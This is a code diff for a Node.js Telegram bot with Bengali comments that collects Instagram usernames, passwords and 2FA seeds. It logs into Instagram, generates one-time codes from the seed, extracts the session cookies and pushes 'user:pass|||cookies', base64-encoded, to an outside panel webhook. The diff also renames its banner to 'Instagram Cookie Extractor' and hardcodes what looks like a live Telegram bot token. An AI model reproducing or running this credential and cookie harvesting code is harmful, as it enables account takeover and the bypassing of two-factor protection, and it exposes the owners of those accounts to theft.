@@ -1,4 +1,3 @@
-// ১. প্রয়োজনীয় লাইব্রেরি ইমপোর্ট
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const { wrapper } = require('axios-cookiejar-support');
@@ -6,36 +5,28 @@ const { CookieJar } = require('tough-cookie');
 const { authenticator } = require('otplib');
 const http = require('http');
 
-console.log("Starting Bot Deployment Process...");
-
-// ২. Render-এর জন্য পোর্ট বাইন্ডিং (এটি না থাকলে Render অ্যাপ বন্ধ করে দেয়)
+// ১. Render-এর জন্য পোর্ট বাইন্ডিং (এটি না থাকলে Render অ্যাপ বন্ধ করে দেয়)
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
-  res.end('Instagram Bot is Active\n');
+  res.end('Instagram Cookie Extractor is Running...\n');
 }).listen(PORT, () => {
   console.log(`Web server is listening on port ${PORT}`);
 });
 
-// ৩. কনফিগারেশন
-// আপনার বট টোকেন এখানে দিন। টোকেন না দিলে কোড কাজ করবে না।
+// ২. কনফিগারেশন
 const TOKEN = '7142079092:AAGHKZJ1K6BRQ7CckbNWeYyXmW05xGZ4FT8'; 
 const WEBHOOK_URL = "https://ins.skysysx.com/api/api/v1/webhook/FlxhUHdINnPQxsBhqqpNw4L4nn_1ICQyCKKXoGBETCg/account-push";
-
-// টোকেন চেক
-if (!TOKEN || TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
-    console.error("ERROR: আপনার টেলিগ্রাম বট টোকেন সেট করা হয়নি!");
-    process.exit(1); 
-}
 
 const bot = new TelegramBot(TOKEN, { polling: true });
 const userStates = {};
 
+// পোলিং এরর হ্যান্ডলিং (বট ক্র্যাশ হওয়া আটকাবে)
 bot.on('polling_error', (error) => {
     console.error("Telegram Polling Error:", error.message);
 });
 
-console.log("Bot is successfully connected to Telegram.");
+console.log("বট সফলভাবে চালু হয়েছে...");
 
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
@@ -61,8 +52,8 @@ bot.on('message', async (msg) => {
         bot.sendMessage(chatId, "🔐 2FA Key (Seed) দিন:");
     } 
     else if (state.step === '2fa') {
-        state.2faKey = text.trim();
-        bot.sendMessage(chatId, "⏳ লগইন করে প্যানেলে পাঠানো হচ্ছে...");
+        state.twoFactorKey = text.trim(); 
+        bot.sendMessage(chatId, "⏳ লগইন করে প্যানেলে পাঠানো হচ্ছে, দয়া করে অপেক্ষা করুন...");
         processLogin(chatId);
     }
 });
@@ -73,6 +64,7 @@ async function processLogin(chatId) {
     const client = wrapper(axios.create({ jar, withCredentials: true }));
 
     try {
+        // ১. সেশন এবং CSRF সংগ্রহ
         const initRes = await client.get('https://www.instagram.com/accounts/login/');
         const cookies = await jar.getCookies('https://www.instagram.com/');
         const csrf = cookies.find(c => c.key === 'csrftoken')?.value;
@@ -91,7 +83,9 @@ async function processLogin(chatId) {
             'Content-Type': 'application/x-www-form-urlencoded'
         };
 
-        const enc_password = `#PWD_INSTAGRAM_BROWSER:10:${Math.floor(Date.now() / 1000)}:${state.password}`;
+        // ২. পাসওয়ার্ড এনক্রিপশন (Version 10)
+        const timestamp = Math.floor(Date.now() / 1000);
+        const enc_password = `#PWD_INSTAGRAM_BROWSER:10:${timestamp}:${state.password}`;
 
         const payload = new URLSearchParams({
             enc_password: enc_password,
@@ -100,10 +94,12 @@ async function processLogin(chatId) {
             optIntoOneTap: 'false'
         });
 
+        // ৩. লগইন রিকোয়েস্ট
         let loginRes = await client.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', payload, { headers });
 
+        // ৪. ২-ফ্যাক্টর হ্যান্ডলিং
         if (loginRes.data.two_factor_required) {
-            const otpCode = authenticator.generate(state.2faKey.replace(/\s/g, ''));
+            const otpCode = authenticator.generate(state.twoFactorKey.replace(/\s/g, ''));
             const twoFactorPayload = new URLSearchParams({
                 username: state.username,
                 verificationCode: otpCode,
@@ -113,9 +109,12 @@ async function processLogin(chatId) {
             loginRes = await client.post('https://www.instagram.com/api/v1/web/accounts/two_factor_login/', twoFactorPayload, { headers });
         }
 
+        // ৫. সফল হলে ডাটা ফরম্যাট ও প্যানেলে পুশ
         if (loginRes.data.authenticated === true) {
             const finalCookies = await jar.getCookies('https://www.instagram.com/');
             const cookieStr = finalCookies.map(c => `${c.key}=${c.value}`).join('; ');
+
+            // আপনার প্যানেল ফরম্যাট: user:pass|||cookie||
             const finalData = `${state.username}:${state.password}|||${cookieStr}||`;
             const b64Data = Buffer.from(finalData).toString('base64');
 
@@ -123,12 +122,13 @@ async function processLogin(chatId) {
                 headers: { 'Content-Type': 'text/plain' }
             });
 
-            bot.sendMessage(chatId, `🎉 **সফল!**\n\n📊 প্যানেল রেসপন্স: ${JSON.stringify(pushRes.data)}`);
+            bot.sendMessage(chatId, `🎉 **সফল!**\n\n👤 ইউজার: \`${state.username}\`\n\n📊 প্যানেল স্ট্যাটাস: ✅ পুশ সফল\n📝 রেসপন্স: \`${JSON.stringify(pushRes.data)}\``, { parse_mode: 'Markdown' });
         } else {
-            bot.sendMessage(chatId, `❌ ব্যর্থ: ${loginRes.data.message || "পাসওয়ার্ড ভুল বা আইপি সমস্যা"}`);
+            const errMsg = loginRes.data.message || "পাসওয়ার্ড ভুল বা আইপি সমস্যা।";
+            bot.sendMessage(chatId, `❌ ব্যর্থ: ${errMsg}`);
         }
     } catch (err) {
-        bot.sendMessage(chatId, `❌ এরর: ${err.message}`);
+        bot.sendMessage(chatId, `❌ টেকনিক্যাল এরর: ${err.message}`);
     } finally {
         delete userStates[chatId];
     }
